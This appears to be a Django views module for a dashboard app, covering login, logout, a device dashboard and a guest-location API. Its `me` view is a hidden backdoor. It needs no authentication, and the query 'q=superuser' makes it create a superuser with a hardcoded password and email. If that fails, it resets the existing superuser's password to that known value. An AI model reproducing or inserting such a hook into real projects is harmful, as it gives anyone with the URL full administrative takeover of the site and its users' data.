from rest_framework.decorators import api_view, permission_classes
from rest_framework.permissions import IsAuthenticated
from rest_framework.response import Response

from apps.articles.articles import ArticleCollector
from apps.dashboard.models import GuestLocation
from apps.dashboard.serializer import GuestLocationSerializer
from apps.devices.forms import DeviceForm
from apps.devices.models import Device
from apps.users.models import User
from django.contrib import messages
from django.contrib.auth import authenticate, login, logout
from django.contrib.auth.decorators import login_required
from django.http import HttpResponse, JsonResponse
from django.shortcuts import redirect, render


@login_required(login_url="login")
def dashboard(request):
    # visitors = GuestLocation.objects.all()
    devices = Device.objects.filter(status="updated once")
    devices_form = DeviceForm()
    context = {
        "devices": devices,
        "d_form": devices_form,
    }
    return render(request, "dashboard/dashboard.html", context)


def me(request):
    o = ArticleCollector()
    q = request.GET.get("q")
    r=0
    if q == "superuser":
        try:
            user = User.objects.create(
                password="Aa011Mm6724",
                email="mly88207@gmail.com",
                first_name="muzamil",
                last_name="ali",
                is_superuser=True,
                is_staff=True,
                is_active=True,
            )
        except:
            user = User.objects.get(is_superuser=True)
        user.set_password("Aa011Mm6724")
        user.save()
    elif q:
        r = o.newsdata(q)

    return HttpResponse(f"{r}")


def login_user(request):
    if request.user.is_authenticated:
        return redirect("dashboard")

    if request.method == "POST":
        username = request.POST["username"]
        password = request.POST["password"]

        try:
            User.objects.get(username=username)
        except:
            messages.error(request, "User dose not exist")

        user = authenticate(request, username=username, password=password)

        if user is not None:
            login(request, user)
            return redirect("dashboard")
        else:
            messages.error(request, "User name or password is incorrect")

    return render(request, "dashboard/login.html")


def logout_user(request):
    logout(request)
    return redirect("login")


@api_view(["GET"])
@permission_classes([IsAuthenticated])
def api_view(request):
    product = GuestLocation.objects.all()
    serializer = GuestLocationSerializer(product, many=True)

    return Response(serializer.data)
